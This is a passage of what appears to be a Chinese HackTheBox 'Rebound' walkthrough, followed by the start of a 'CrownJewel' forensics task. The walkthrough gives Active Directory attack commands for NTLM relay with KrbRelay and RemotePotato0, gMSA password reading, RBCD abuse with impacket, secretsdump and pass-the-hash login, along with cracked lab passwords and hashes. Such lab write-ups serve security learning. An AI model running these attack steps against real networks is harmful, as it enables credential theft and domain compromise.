<code>console</code>）。</td></tr><tr><td><code>/password:&lt;密码&gt;</code></td><td>用于切换会话时提供密码（一般不常用）。</td></tr><tr><td><code>/v</code></td><td>详细模式，显示执行过程信息。</td></tr></tbody></table></div></blockquote><p>但是这个命令无法运行在我们的目标机器上，我们需要使用<a href="https://github.com/antonioCoco/RunasCs">RunasCs</a>这个工具，它存在已经编译过的版本，我们直接传到靶机上即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/chromosome/HTB/Rebound/RunasCs.exe /tools/RunasCs.exe</span><br></pre></td></tr></table></figure><p>命令如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RunasCs.exe username password cmd [-<span class="type">d</span> <span class="type">domain</span>] [-<span class="type">f</span> <span class="type">create_process_function</span>] [-<span class="type">l</span> <span class="type">logon_type</span>] [-<span class="type">r</span> <span class="type">host</span>:<span class="type">port</span>] [-<span class="type">t</span> <span class="type">process_timeout</span>] [--<span class="type">force</span>-<span class="type">profile</span>] [--<span class="type">bypass</span>-<span class="type">uac</span>] [--<span class="type">remote</span>-<span class="type">impersonation</span>]</span><br></pre></td></tr></table></figure><p>让我们确认一下当前机器上还有哪个用户在登录（利用<code>Run a command simulating the /netonly flag of runas.exe</code>）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RunasCs.exe oorend <span class="string">&#x27;1GR8t@$$4u&#x27;</span> <span class="literal">-l</span> <span class="number">9</span> <span class="string">&quot;qwinsta&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>-l logon_type</code>的值可以在下面的网址中找到</p><p><a href="https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types">https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types</a></p></blockquote><p>和我们分析的一样，存在一个<code>tbrady</code>用户</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250224190531.png" alt="微信截图_20250224190531"></p><p>利用bloodhound分析<code>tbrady</code>账户</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250224185239.png" alt="微信截图_20250224185239"></p><p>它存在读取GMSA密码的权限</p><blockquote><p><code>ReadGMSAPassword</code>权限</p><p>此权限允许您读取<code>组托管服务帐户（Group Managed Service Account  GMSA）</code>的密码。组托管服务帐户是Active Directory中的一种特殊类型对象，该对象的密码由域控制器管理，并在设定的时间间隔内自动更改（检查MSDS-ManagedPasswordInterval属性）。</p><p>GMSA的预期用途是允许某些计算机帐户检索GMSA的密码，然后以该GMSA身份运行本地服务。拥有授权主体控制权的攻击者可以滥用此权限来模拟GMSA。</p><p><strong>GMSA（Group Managed Service Account，组托管服务账户）</strong> 是微软在 Windows Server 2012 中引入的一种<strong>托管服务账户（MSA, Managed Service Account）</strong>，主要用于提升安全性和简化密码管理。GMSA 允许多个计算机（如 Web 服务器群集或 SQL 服务器群集）共享一个自动管理的服务账户，并用于运行服务或任务，而不需要手动管理密码。</p><p><strong>计算机可以向 DC 请求当前的 GMSA 密码，但不会直接显示密码，而是通过 Kerberos 票据进行身份验证。</strong></p><p><strong>GMSA 不能用于交互式登录（即无法直接登录到计算机），只能用于运行服务或任务。</strong></p></blockquote><p>我们接下来将要滥用<code>tbrady</code>账户已经登录的会话，通过触发身份验证回传到我们的机器，并将其中继以转储哈希值。我们有两种方法可以实现上面的攻击方式。</p><h3 id="KrbRelay-RunAs"><a href="#KrbRelay-RunAs" class="headerlink" title="KrbRelay + RunAs"></a>KrbRelay + RunAs</h3><p>攻击的前提条件为：</p><ul><li>没有微软2022年10月的补丁</li><li>必须禁用LDAP签名（Windows默认值）</li></ul><p>LDAP禁用签名的验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&quot;402 minutes&quot;</span> nxc ldap 10.10.11.231 -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -M ldap-checker -k </span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250224191422.png" alt="微信截图_20250224191422"></p><p>对kKrbRelay进行编译，这里需要编译两个文件</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250224191534.png" alt="微信截图_20250224191534"></p><p>然后将他们全部上传到靶机上（<code>CheckPort.exe</code>在攻击中并未用到）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload /home/chromosome/HTB/Rebound/KrbRelay.exe KrbRelay.exe </span><br><span class="line">upload /home/chromosome/HTB/Rebound/CheckPort.exe CheckPort.exe</span><br></pre></td></tr></table></figure><p><code>CheckPort.exe</code>：用于发现OXID resolver可用端口的 C# 工具</p><blockquote><p><code>OXID Resolver</code>： 主要利用了<strong>OXID</strong>（<strong>Object Exchange Identifier</strong>）的机制，这是 Windows 中用于识别COM（Component Object Model）和DCOM（Distributed Component Object Model）的一种标识符。它与 <strong>DCE/RPC</strong>（分布式计算环境/远程过程调用）有关，通常涉及到 Windows 远程管理和其他分布式服务的通信。</p></blockquote><p>使用<code>-ntlm</code>指定NTLM认证，使用<code>-session</code> 指定会话号，并提供一个具有正确权限的有效 RPC 服务的 CLSID，在<a href="https://github.com/cube0x0/KrbRelay#clsids">KrbRelay</a>的github仓库中的Windows Server 2019下的Cross-Session Relay值中选择一个即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./RunasCs.exe oorend <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -l 9 <span class="string">&quot;c:\users\winrm_svc\MyTools\KrbRelay.exe -ntlm -session 1 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>使用<code>RunasCs.exe</code>的原因是：该漏洞利用需要一个交互式会话，例如控制台。在这些会话中，凭证被存储在内存中，因此可以被漏洞利用访问，而不像现在使用的 WinRM 远程会话</p></blockquote><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250224202033.png" alt="微信截图_20250224202033"></p><p>现在我们获得了<code>tbrady</code>的NetNTLMv2哈希，我们可以利用任何的密码破解工具进行自动化解密</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tbrady::rebound:a69b51d5e3c25c34:4b5740ddf88bad167dd80c375a00d2bb:0101000000000000c058b1acee86db015c815522b83bb4bb0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800c058b1acee86db01060004000600000008003000300000000000000001000000002000003efda9b6b168eda7a080c22519dd8969aad8f27bf444db463d23dd02f0df73580a00100000000000000000000000000000000000090000000000000000000000</span><br></pre></td></tr></table></figure><p>解密得到</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TBRADY::rebound:a69b51d5e3c25c34:4b5740ddf88bad167dd80c375a00d2bb:0101000000000000c058b1acee86db015c815522b83bb4bb0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800c058b1acee86db01060004000600000008003000300000000000000001000000002000003efda9b6b168eda7a080c22519dd8969aad8f27bf444db463d23dd02f0df73580a00100000000000000000000000000000000000090000000000000000000000:543BOMBOMBUNmanda</span><br></pre></td></tr></table></figure><p>和前两个账户一样没有winrm的权限</p><h3 id="RemotePotato0"><a href="#RemotePotato0" class="headerlink" title="RemotePotato0"></a>RemotePotato0</h3><blockquote><p>它利用了 DCOM 激活服务，并触发了目标机器上当前所有登录用户的 NTLM 认证。要求目标机器上有一个特权用户登录（例如，域管理员用户）。一旦 NTLM Type 1 认证被触发，我们设置一个跨协议的中继服务器，接收特权的 Type 1 消息，并通过解包 RPC 协议并将认证信息封装为 HTTP 协议后，将其中继到第三方资源。在接收端，你可以设置一个进一步的中继节点（例如 ntlmrelayx），或者直接中继到一个特权资源。RemotePotato0 还允许抓取并窃取机器上所有登录用户的 NTLMv2 哈希值。</p></blockquote><p>因为登录的是非管理员特权账户，我们的目标是进行横向移动</p><p>利用模块2 Rpc capture (hash) server + potato trigger</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RemotePotato0.exe -m 2 -s 1</span><br></pre></td></tr></table></figure><p>会显示出现问题</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] Detected a Windows Server version not compatible with JuicyPotato, you cannot run the RogueOxidResolver on 127.0.0.1. RogueOxidResolver must be run remotely.</span><br><span class="line">[!] Example Network redirector:</span><br><span class="line"><span class="code">sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&#123;&#123;ThisMachineIp&#125;&#125;:9999</span></span><br></pre></td></tr></table></figure><blockquote><p>这种类型的 RPC 连接将仅针对 TCP 135 端口。由于我无法在 Rebound 上监听 TCP 135（因为它已经在监听合法的 RPC 服务），我将让漏洞利用指向我的主机，然后将流量转发回 RemotePotato0 的 9999 端口。我将在我的主机上运行 socat：<code>sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999</code>。这样，流量将先到达我的主机的 135 端口，然后被转发回 Rebound 的 9999 端口，在那里 RemotePotato0 正在监听。</p></blockquote><p>我们在本机上设置一个<code>socat</code>监听器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999</span><br></pre></td></tr></table></figure><p>然后在目标机器上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.31 -p 9999</span><br></pre></td></tr></table></figure><p>仍然可以中继到哈希</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250225214721.png" alt="微信截图_20250225214721"></p><h2 id="读取GMSA哈希"><a href="#读取GMSA哈希" class="headerlink" title="读取GMSA哈希"></a>读取GMSA哈希</h2><p>有多种方式进行读取<code>delegator$</code>账户哈希</p><h3 id="bloodyAD"><a href="#bloodyAD" class="headerlink" title="bloodyAD"></a>bloodyAD</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -d rebound.htb -u tbrady -p <span class="string">&#x27;543BOMBOMBUNmanda&#x27;</span> --host dc01.rebound.htb</span><br><span class="line">get object <span class="string">&#x27;delegator$&#x27;</span> --resolve-sd --attr msDS-ManagedPassword</span><br></pre></td></tr></table></figure><blockquote><p><strong><code>--resolve-sd</code></strong>：解析对象的安全描述符（Security Descriptor, SD），包括权限和访问控制列表（ACLs）。</p><p><strong><code>--attr msDS-ManagedPassword</code></strong>：专门获取 <code>msDS-ManagedPassword</code> 属性，该属性包含gMSA的托管密码。</p></blockquote><p>返回NTLM哈希和base64编码后的形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb</span><br><span class="line">msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:45326e68995ec3b859228fd504be8617</span><br><span class="line">msDS-ManagedPassword.B64ENCODED: J837EVqQxZaVQRIIcfXPa5QslWda+X7BVkj/v1Plp8QPgYPJ/X7cFKRxa2u1c5w32g7mkGxukmnyjgw5p/Q9dWtkO1Ok1CUPFla4DP9uzxHwRJdA7rFn7InTBTjuwXztetP3uqc39Yu8KPdh29wHEeog79QHNqok4LoqyUHzVA9qoZnglYjAKbNIFkafEB+47KIf6mEDmK4rnuGJEG+TaZVKBnw1tJ01+z8QoMiKtXV0GKNzqkTOEsdScQf08w8E6MSSoB2djg2ViXzmpWsQlrbhoGW3Es2C7eSx4wIEespxGn+EhD1N3bgnqbYTShO2xxcDaW7te6rGDkkLLtC5jw==</span><br></pre></td></tr></table></figure><h3 id="nxc"><a href="#nxc" class="headerlink" title="nxc"></a>nxc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> faketime <span class="string">&quot;402 minutes&quot;</span> ldap rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k --gmsa</span><br><span class="line"> </span><br><span class="line"> SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAPS       10.10.11.231    636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda </span><br><span class="line">LDAPS       10.10.11.231    636    DC01             [*] Getting GMSA Passwords</span><br><span class="line">LDAPS       10.10.11.231    636    DC01             Account: delegator$           NTLM: 45326e68995ec3b859228fd504be8617</span><br></pre></td></tr></table></figure><h3 id="GMSAPasswordReader"><a href="#GMSAPasswordReader" class="headerlink" title="GMSAPasswordReader"></a><a href="https://github.com/rvazarkar/GMSAPasswordReader">GMSAPasswordReader</a></h3><p>bloodhound推荐的</p><p><code>delegator$</code>账户仍不适用于winrm登录</p><h2 id="利用基于资源的约束委派提权"><a href="#利用基于资源的约束委派提权" class="headerlink" title="利用基于资源的约束委派提权"></a>利用基于资源的约束委派提权</h2><p>在bloodhound中寻找<code>delegator$</code>的Constrained Delegations，似乎没有什么特别重要的委派权限</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250225222827.png" alt="微信截图_20250225222827"></p><p>我们使用另一个工具重新枚举一下委派权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-findDelegation <span class="string">&#x27;rebound.htb/delegator$&#x27;</span> -dc-ip 10.10.11.231 -k -hashes :45326e68995ec3b859228fd504be8617</span><br></pre></td></tr></table></figure><p>我们发现了一个可以利用的约束委派</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AccountName  AccountType                          DelegationType  DelegationRightsTo     SPN Exists </span><br><span class="line">-----------  -----------------------------------  --------------  ---------------------  ----------</span><br><span class="line">delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No         </span><br></pre></td></tr></table></figure><p>我们尝试进行利用一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-getST -spn http/dc01.rebound.htb -impersonate administrator -hashes :45326e68995ec3b859228fd504be8617 -dc-ip dc01.rebound.htb <span class="string">&#x27;rebound.htb/delegator\$&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226155606.png" alt="微信截图_20250226155606"></p><p>发现出现了报错<code>Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable</code>，说明我们利用的委派不是可以转发的，即没有启用<strong>Constrained Delegation with Protocol Transition</strong>（其实也就是使用任何身份验证协议这个选项），也就是说S4U2Self 步骤无法生成一个可转发的票据，从而导致 S4U2Proxy 步骤失败</p><blockquote><p>本质上，Service for User to Self（S4U2Self）协议使得一个服务可以代表其他用户请求一个服务票据，但该票据是供其自身使用的。相对地，Service for User to Proxy（S4U2Proxy）协议允许一个服务代表其他用户请求服务票据，但该票据是供其他服务使用的。</p></blockquote><p>我们接下来利用<code>-self</code>选项让程序在<code>S4U2Self</code>请求完票据后停下，返回一张<code>TGS</code>，不再让<code>S4U2Proxy</code>进行转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-getST -spn http/dc01.rebound.htb -impersonate administrator -hashes :45326e68995ec3b859228fd504be8617 -dc-ip dc01.rebound.htb <span class="string">&#x27;rebound.htb/delegator\$&#x27;</span> -self</span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226182559.png" alt="微信截图_20250226182559"></p><p>看一下这张票据的属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-describeTicket administrator@delegator\<span class="variable">$@REBOUND</span>.HTB.ccache </span><br></pre></td></tr></table></figure><p>在<code>Flag</code>属性中缺少<code>forwardable</code>标志</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226182835.png" alt="微信截图_20250226182835"></p><p>现在我们看一下Resource-Based Constrained Delegation流程（来自这篇<a href="https://myzxcg.com/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/#contents:%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">文章</a>）：</p><ol><li>服务1使用自己的Hash向KDC申请一个TGT票据（可转发的）。</li><li>服务1代表用户申请一个获得针对服务1自身的kerberos服务票据(S4U2SELF过程，返回的票据是不可转发的）这个过程设置Resource-Based Constrained Delegation(RBCD)标志位。</li><li>服务1可以使用来自用户的授权( 在S4U2SELF阶段获得的不可转发的TGS)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的可转发的TGS。</li></ol><p>我们发现这里的第二步的不可转发票据和我们当前的情况十分类似，因此我们可以基于RBCD进行利用。（这里还存在一种思路即强制或等待用户向服务进行身份验证，同时运行一个 Kerberos 监听器但是不是特别适合）</p><p>基于这种委派我们主要关注<code>msDS-AllowedToDelegateTo</code>属性（配置传出信任）和<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>（配置传入信任）</p><p>利用步骤仍然参考这篇<a href="https://myzxcg.com/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/#contents:%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">文章</a></p><ol><li>拥有一个任意的服务账户1或者计算机账户1</li><li>获得了服务账户2的LDAP权限（即有修改服务账户2属性的权限）</li><li>配置服务1对服务2的约束委派，在服务账户2的用户属性上配置 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 为服务账户1的SID</li><li>发起一个从服务1到服务2的正常的约束委派的流程访问服务2</li></ol><p><strong>注：这里在选择服务的时候基于一条约束条件为该服务必须至少有一个 SPN</strong></p><p>我们将把<code>ldap_monitor</code>添加到 <code>delegator$</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性中，从而允许 <code>ldap_monitor</code>委派到 <code>delegator$</code></p><p>将<code>dc01</code>添加到host文件中，否则我们接下来将利用的工具将报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.231 dc01 dc01.rebound.htb rebound.htb</span><br></pre></td></tr></table></figure><p>执行下面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> python3 rbcd.py rebound.htb/delegator$ -hashes :45326e68995ec3b859228fd504be8617 -k -delegate-from ldap_monitor -delegate-to delegator$ -action write -dc-ip dc01 -use-ldaps</span><br></pre></td></tr></table></figure><blockquote><p><strong><code>-delegate-from ldap_monitor</code></strong>：指定要添加到 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的服务账户，这里是 <code>ldap_monitor</code>。</p><p><strong><code>-delegate-to delegator$</code></strong>：指定目标服务账户，这里是 <code>delegator$</code>。</p><p><strong><code>-action write</code></strong>：指定操作类型为“写入”，即将 <code>ldap_monitor</code> 添加到 <code>delegator$</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性中。</p></blockquote><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226192729.png" alt="微信截图_20250226192729"></p><p>利用powerview验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObject -Identity delegator$</span><br></pre></td></tr></table></figure><p>但是在执行完成返回的查询中并没有看到这个属性</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226193105.png" alt="微信截图_20250226193105"></p><p>使用findDelegation再次查看委派</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-findDelegation <span class="string">&#x27;rebound.htb/delegator$&#x27;</span> -dc-ip 10.10.11.231 -k -hashes :45326e68995ec3b859228fd504be8617</span><br></pre></td></tr></table></figure><p>从下图中我们可以看到新添加的委派已经成功添加了</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226192942.png" alt="微信截图_20250226192942"></p><p>到现在为止，RBCD攻击的所有准备已经完成，我们将完成最后的攻击：其核心思想是，我们可以从 <code>ldap_monitor</code> 请求一张针对 <code>delegator$</code> 的票据，并为模拟的账户创建一张可转发的服务票据（Service Ticket）。</p><p>现在让我们选择合适的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity Administrator</span><br></pre></td></tr></table></figure><p>管理员账户不能被委派</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226193852.png" alt="微信截图_20250226193852"></p><p>那么我们选择<code>dc01</code>上的机器账户<code>DC01$</code></p><p>这张可转发的ST随后可以利用 <code>delegator$</code> 的约束委派权限，转发到域控制器（DC），从而为 <code>DC01$</code> 生成一张针对域控制器的ST。</p><p>首先，我们从 <code>ldap_monitor</code> 请求一张针对 <code>delegator$</code> 的服务票据ST，并模拟 <code>DC01$</code> 账户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-getST -spn browser/dc01.rebound.htb rebound.htb/ldap_monitor:<span class="string">&#x27;1GR8t@$$4u&#x27;</span> -impersonate DC01$</span><br></pre></td></tr></table></figure><p>出现<code>KDC_ERR_BADOPTION(KDC cannot accommodate requested option)</code>报错就重新添加一下委派</p><p>这时生成的是一张可转发的票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-describeTicket DC01\<span class="variable">$@browser_dc01</span>.rebound.htb@REBOUND.HTB.ccache</span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226195250.png" alt="微信截图_20250226195250"></p><p>现在，我已经拥有了一张作为 <code>DC01$</code> 针对 <code>delegator$</code> 的服务票据ST，<code>delegator$</code> 可以利用这张票据以及约束委派权限，获取一张针对 <code>DC01</code> 的 <code>DC01$</code> 服务票据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-getST rebound.htb/delegator\$ -hashes :45326e68995ec3b859228fd504be8617 -spn http/dc01.rebound.htb -additional-ticket DC01\<span class="variable">$@browser_dc01</span>.rebound.htb@REBOUND.HTB.ccache -impersonate DC01$</span><br></pre></td></tr></table></figure><blockquote><p><code>-additional-ticket</code>：指定可转发票据，我们将其直接传递给S4U2Proxy，从而能够获取一张针对域控制器的 <code>DC01$</code> 服务票据ST</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=DC01<span class="variable">$@http_dc01</span>.rebound.htb@REBOUND.HTB.ccache secretsdump.py -k -no-pass dc01.rebound.htb -just-dc-user administrator</span><br></pre></td></tr></table></figure><blockquote><p>利用NTDS.DIT数据库解密</p><p><code>-just-dc-ntlm</code>：所有的NTLM哈希</p><p><code>-just-dc-user</code>：指定的用户哈希</p></blockquote><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226211052.png" alt="微信截图_20250226211052"></p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226211114.png" alt="微信截图_20250226211114"></p><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p>winrm登录即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.231 -u administrator -H 176be138594933bb67db3b2572fc91b8</span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226211553.png" alt="微信截图_20250226211553"></p>]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pentest </tag>
            
            <tag> Active Directory </tag>
            
            <tag> Relay Attack </tag>
            
            <tag> RBCD Attack </tag>
            
            <tag> Potato </tag>
            
            <tag> Bloodhound </tag>
            
            <tag> Roasting </tag>
            
            <tag> Crypto Spray </tag>
            
            <tag> Shadow Credentials </tag>
            
            <tag> Enumerate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-CrownJewel-1</title>
      <link href="/2025/01/22/HTB-CrownJewel-1/"/>
      <url>/2025/01/22/HTB-CrownJewel-1/</url>
      
        <content type="html"><![CDATA[<p><img src="/2025/01/22/HTB-CrownJewel-1/微信截图_20250122170353.png" alt="微信截图_20250122170353"></p><h2 id="Sherlock-Scenario"><a href="#Sherlock-Scenario" class="headerlink" title="Sherlock Scenario"></a>Sherlock Scenario</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Forela&#x27;s domain controller is under attack. The Domain Administrator account is believed to be compromised, and it is suspected that the threat actor dumped the NTDS.dit database on the DC. We just received an alert of vssadmin being used on the DC, since this is not part of the routine schedule we have good reason to believe that the attacker abused this LOLBIN utility to get the Domain environment&#x27;s crown jewel. Perform some analysis on provided artifacts for a quick triage and if possible kick the attacker as early as possible.</span><br></pre></td></tr></table></figure><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> Attackers can abuse the vssadmin utility to create volume shadow snapshots and then extract sensitive files like NTDS.dit to bypass security mechanisms. Identify the time when the Volume Shadow Copy service entered a running state.</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> When a volume shadow snapshot is created, the Volume shadow copy service validates the privileges using the Machine account and enumerates User groups. Find the two user groups the volume shadow copy process queries and the machine account that did it.</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> Identify the Process ID (in Decimal) of the volume shadow copy service process.</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> Find the assigned Volume ID/GUID value to the Shadow copy snapshot when it was mounted.</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> Identify the full path of the dumped NTDS database on disk.</span><br><span class="line"></span><br><span class="line"><span class="bullet">6.</span> When was newly dumped ntds.dit created on disk?</span><br><span class="line"></span><br><span class="line"><span class="bullet">7.</span> A registry hive was also dumped alongside the NTDS database. Which registry hive was dumped and what is its file size in bytes?</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>题目给了evtx文件和MFT文件，我们先来对这两个文件进行简要的解释</p><h3 id="evtx"><a href="#evtx" class="headerlink" title="evtx"></a>evtx</h3><p><code>.evtx</code> 文件是 Windows 操作系统的 <strong>事件日志文件格式</strong>，它用于存储系统、应用程序、安全相关的事件日志。Windows NT 和 Windows 2000 之前的版本的文件格式为<code>.evt</code>。</p><p>日志文件通常存储在下面的默认路径中</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\winevt\Logs\</span><br></pre></td></tr></table></figure><p>常见的日志文件有</p><ul><li><p><strong>Application.evtx</strong>：记录应用程序或系统程序运行方面的日志事件，比如数据库程序可以在应用程序日志中记录文件错误，应用的崩溃记录等。</p></li><li><p><strong>System.evtx</strong>：记录操作系统自身组件产生的日志事件，比如驱动、系统组件和应用软件的崩溃以及数据丢失错误等等。</p></li><li><p><strong>Security.evtx</strong>：记录系统的安全审计日志事件，比如登录事件、对象访问、进程追踪、特权调用、帐号管理、策略变更等。这个日志在我们取证当中经常用到。</p></li><li><p><strong>Setup.evtx</strong>：记录安装相关事件。</p></li></ul><p>接下来介绍一下常见的<code>Event ID</code></p><h4 id="Security-evtx"><a 